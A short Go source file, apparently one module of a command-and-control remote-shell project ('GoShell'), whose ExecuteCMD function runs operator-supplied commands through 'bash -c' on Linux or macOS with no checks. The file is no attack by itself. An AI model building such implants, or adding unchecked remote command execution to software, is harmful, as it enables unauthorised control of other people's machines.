package modules

/* Import modules */
import (
	"os/exec"
	c2d "github.com/acheong08/GoShell/c2Data"
)

func ExecuteCMD(cmd c2d.Cmd) (string, error) {
	if cmd.Os == "linux" || cmd.Os == "darwin"{
		out, err := exec.Command("bash", "-c" , cmd.Command).Output()
		if err != nil{
			return "Unable to execute" , err
		}
		var strOut string = string(out)
		return strOut, nil
	} else{
		return "Wrong OS", nil
	}
}
